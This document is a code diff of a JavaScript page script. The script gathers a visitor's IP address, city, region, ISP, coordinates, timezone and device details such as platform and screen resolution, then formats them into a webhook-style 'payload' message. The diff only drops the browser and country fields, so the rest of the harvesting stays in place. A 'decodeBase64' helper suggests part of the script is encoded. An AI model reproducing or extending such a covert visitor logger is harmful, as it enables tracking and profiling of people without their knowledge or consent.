@@ -111,7 +111,6 @@ function decodeBase64(encoded) {
                 const ipData = await response.json();
 
                 const browserData = {
-                    browser: navigator.userAgent,
                     platform: navigator.platform,
                     resolution: `${window.screen.width} x ${window.screen.height}`,
                     colorDepth: `${window.screen.colorDepth} bits`,
@@ -128,7 +127,6 @@ function decodeBase64(encoded) {
     latitude: ipData.latitude ? ipData.latitude.toString() : "N/A",
     longitude: ipData.longitude ? ipData.longitude.toString() : "N/A",
     timezone: ipData.timezone || "N/A",
-    browser: browserData.browser,
     platform: browserData.platform,
     resolution: browserData.resolution,
     colorDepth: browserData.colorDepth,
@@ -143,9 +141,8 @@ const payload = {
     content: `
 **User Information:**
 IP: ${userData.ip || "N/A"}
-Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}, ${userData.country || "N/A"}
+Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}
 ISP: ${userData.isp || "N/A"}
-Browser: ${userData.browser}
 Platform: ${userData.platform}
 Resolution: ${userData.resolution}
 Color Depth: ${userData.colorDepth}
@@ -179,9 +176,8 @@ Longitude: ${userData.longitude || "N/A"}
             if (userData) {
                 const details = [
     `IP Address: ${userData.ip || "N/A"}`,
-    `Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}, ${userData.country || "N/A"}`,
+    `Location: ${userData.city || "N/A"}, ${userData.region || "N/A"}`,
     `ISP: ${userData.isp || "N/A"}`,
-    `Browser: ${userData.browser}`,
     `Platform: ${userData.platform}`,
     `Resolution: ${userData.resolution}`,
     `Color Depth: ${userData.colorDepth}`,
